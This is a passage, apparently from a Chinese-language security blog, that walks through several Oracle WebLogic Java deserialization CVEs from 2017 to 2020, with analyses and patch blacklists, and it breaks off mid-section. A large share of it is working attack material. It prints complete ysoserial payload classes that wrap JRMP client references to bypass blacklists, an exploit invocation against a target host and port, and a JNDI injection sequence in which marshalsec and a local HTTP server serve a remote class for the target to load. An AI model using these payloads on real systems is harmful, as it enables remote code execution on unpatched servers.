<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还有一种通过CVE-2016-1000031 Apache Commons Fileupload进行任意文件写入</p>
<p>再者可以直接去掉CVE-2017-3248的Proxy的封装，从而直接绕过resolveProxyClass()方法</p>
</blockquote>
<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2017-3248的绕过，因为<code>InboundMsgAbbrev</code>类的<code>resolveProxyClass()</code>仅仅只是对<code>java.rmi.registry.Registry</code>进行判断，所以我们可以通过其他RMI接口绕过，比如<code>java.rmi.activation.Activator</code></p>
<p>exploit的编写就是直接替换</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101272148c437c1ee4656e33bf769.png" alt="image-20210127214823732"></p>
<p><strong>补丁</strong></p>
<p>在<code>WeblogicFilterConfig.class</code>的黑名单中添加了<code>sun.rmi.server.UnicastRef</code>进行防御</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">     <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, </span><br><span class="line">     <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, </span><br><span class="line">     <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>,</span><br><span class="line">     <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, </span><br><span class="line">     <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span> <span class="comment">// new</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p>
</blockquote>
<p><strong>payload</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span> &lt; Registry &gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> &#123;</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">        streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">        <span class="keyword">return</span> streamMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, remoteObjectInvocationHandler);</span><br><span class="line">        <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object)); <span class="comment">// 用streamMessageImpl封装</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2018-2628的黑名单绕过，主要利用<code>weblogic.jms.common.StreamMessageImpl</code>在反序列化时不用经过<code>resolveProxyClass()</code>检查</p>
<p><strong>补丁</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = &#123; </span><br><span class="line">    <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, </span><br><span class="line">    <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, </span><br><span class="line">    <span class="string">&quot;javassist&quot;</span>, </span><br><span class="line">    <span class="string">&quot;java.rmi.activation&quot;</span>, <span class="comment">// new</span></span><br><span class="line">    <span class="string">&quot;sun.rmi.server&quot;</span> <span class="comment">// new</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, </span><br><span class="line">    <span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="comment">// new</span></span><br><span class="line">    <span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span> <span class="comment">// new</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p>
</blockquote>
<p><strong>poc</strong></p>
<p><em>payload1</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl_Stub;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RMIConnectionImpl_Stub</span> <span class="variable">stub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnectionImpl_Stub</span>(ref); <span class="comment">// 使用RMIConnectionImpl_Stub封装</span></span><br><span class="line">        <span class="keyword">return</span> stub;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>payload2</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient4</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;ReferenceWrapper_Stub&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ReferenceWrapper_Stub  <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper_Stub</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper_Stub</span>(ref); <span class="comment">// 使用ReferenceWrapper_Stub封装</span></span><br><span class="line">        <span class="keyword">return</span> stu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此漏洞是对cve-2018-2893的黑名单绕过，可以使用<code>ReferenceWrapper_Stub</code>或者<code>RMIConnectionImpl_Stub</code>代替<code>RemoteObjectInvocationHandler</code>，关键是在找<code>RemoteObject</code>类的子类</p>
<p><strong>补丁</strong></p>
<p>直接将基类<code>RemoteObject</code>加入到黑名单</p>
<h4 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h4><blockquote>
<p>WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SukaraLin/CVE-2019-2890">https://github.com/SukaraLin/CVE-2019-2890</a></p>
<p>详细操作在README已经给出</p>
<p><strong>漏洞分析</strong></p>
<p>漏洞代码位于<code>weblogic.jar</code>中的<code>weblogic.wsee.jaxws.persistence.PersistentContext.class</code>类中，它的<code>readSubject()</code>方法中直接调用了<code>readObject()</code>方法进行反序列化，所以我们只要对着<code>writeObject()</code>写一个恶意对象就可以</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373db23c5e588f464ce262.png" alt="image-20210126175015051"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437983682858b6836f4756d.png" alt="image-20210126175040943"></p>
<p><strong>补丁</strong></p>
<p>增加黑名单检测</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">FilteringObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    	<span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123; </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>. firstClassName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName(); </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            	clazz.asSubclass(Subject.class);]</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>. firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h4><blockquote>
<p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2551.git">https://github.com/Y4er/CVE-2020-2551.git</a></p>
<p>这个payload只能用在直连网络下，所以Win下本地打docker是打不了的，你可以选择自己本地搭一个服务器，可以选择在Linux虚拟机起docker，当然还有更简单的就是自己在docker里装个jdk8，然后在docker里打（因为这个payload只能用jdk8运行）</p>
<p>创建依赖库的<code>wlfullclient.jar</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd WL_HOME/server/lib</span><br><span class="line">java -jar wljarbuilder.jar</span><br></pre></td></tr></table></figure>

<p>编译exp.java，这里必须保证jdk版本与目标环境一样</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -source 1.6 -target 1.6 exp.java</span><br></pre></td></tr></table></figure>

<p>开启JNDI触发漏洞</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://172.18.0.2/#exp&quot; 1099</span><br><span class="line">java -jar CVE-2020-2551.jar 172.18.0.2 7001 rmi://172.18.0.2:1099/exp</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>RMI-IIOP具体原理可参考这篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7422">文章</a></p>
<p>这个漏洞源于对<code>JtaTransactionManager</code>类的错误过滤导致的IIOP反序列化，我们把入口点定在<code>JtaTransactionManager</code>类的<code>readObject()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357376eba9d4fcbd4f18d3e.png" alt="image-20210129213556384"></p>
<p>在<code>initUserTransactionAndTransactionManager()</code>方法中调用了<code>lookupUserTransaction()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357e8f7f0c1ecfb087927ac.png" alt="image-20210129213630278"></p>
<p>在<code>lookupUserTransaction()</code>方法中使用<code>getJndiTemplate()</code>返回的<code>jndiTemplate</code>实例的<code>lookup()</code>方法进行JNDI</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135808a71fb5f2e6ce2397eb.png" alt="image-20210129213658529"></p>
<p>所以只要控制我们的<code>userTransactionName</code>属性就可以JNDI任意类</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135893e48783bc4de871b44d.png" alt="image-20210129213846393"></p>
<p>根据这篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7422">博客</a>可以知道，这个gadget在<a target="_blank" rel="noopener" href="https://paper.seebug.org/718/">CVE-2018-3191</a>就已经被挖掘出来，当时修复的时候是<code>JtaTransactionManager</code>的父类<code>AbstractPlatformTransactionManager</code>加入到了黑名单列表，T3协议使用的是<code>resolveClass</code>方法进行过滤，<code>resolveClass</code>方法是会读取父类的，但是IIOP协议就不会去读取父类导致我们可以绕过黑名单，触发JNDI注入。</p>
<p>下面是exploit的核心部分</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建jndi的context</span></span><br><span class="line">Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, rhost);</span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="comment">// payload</span></span><br><span class="line"><span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">jtaTransactionManager.setUserTransactionName(rmiurl);</span><br><span class="line"><span class="comment">// 代理类封装并绑定</span></span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> createMemoitizedProxy(createMap(<span class="string">&quot;Foo&quot;</span>, jtaTransactionManager), Remote.class);</span><br><span class="line">context.rebind(<span class="string">&quot;Foo&quot;</span>), remote);</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>据说是直接封禁IIOP协议？</p>
<h4 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h4><blockquote>
<p>Oracle Coherence 3.7.1.17、12.1.3.0、12.2.1.3、12.2.1.4</p>
<p>需要注意的虽然Weblogic 10.3.6.0自带Oracle Coherence 3.7，但是它默认未启用Coherence，所以不在影响范围之内</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2555.git">https://github.com/Y4er/CVE-2020-2555.git</a></p>
<p><strong>漏洞分析</strong></p>
<p>漏洞入口在<code>coherence.jar</code>的<code>LimitFilter</code>类的<code>toString()</code>方法中，而<code>BadAttributeValueExpException</code>这个类可以调用任何类（val）的<code>toString()</code>方法，只要控制<code>setSecurityManager</code>为<code>null</code>即可，所以我们利用它来封装我们的恶意对象</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437bc0b762a1921e1de3106.png" alt="image-20210127123724776"></p>
<p>在<code>toString()</code>方法中，提取<code>m_comparator</code>的值作为ValueExtractor，再对<code>m_oAnchorTop</code>和<code>m_oAnchorBottom</code>调用<code>extract()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373cd6a3047dec16ffcc82.png" alt="image-20210127131228572"></p>
<p>进入<code>extract()</code>，它是创建一个的aExtractor，并递归调用<code>extract()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714378d6a778ed7c269d93054.png" alt="image-20210127131851693"></p>
<p><code>getExtractors()</code>返回的是<code>m_aExtractor</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714371dcf8ddf74226cda2ecc.png" alt="image-20210127131908064"></p>
<p>内部的<code>extract()</code>就是利用反射机制返回方法调用，方法名和参数都可以空，所以只要构成一条extract chain就可以实现任意代码执行了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437e11ca574d1a166db1591.png" alt="image-20210127132406861"></p>
<p>exploit核心部分</p>
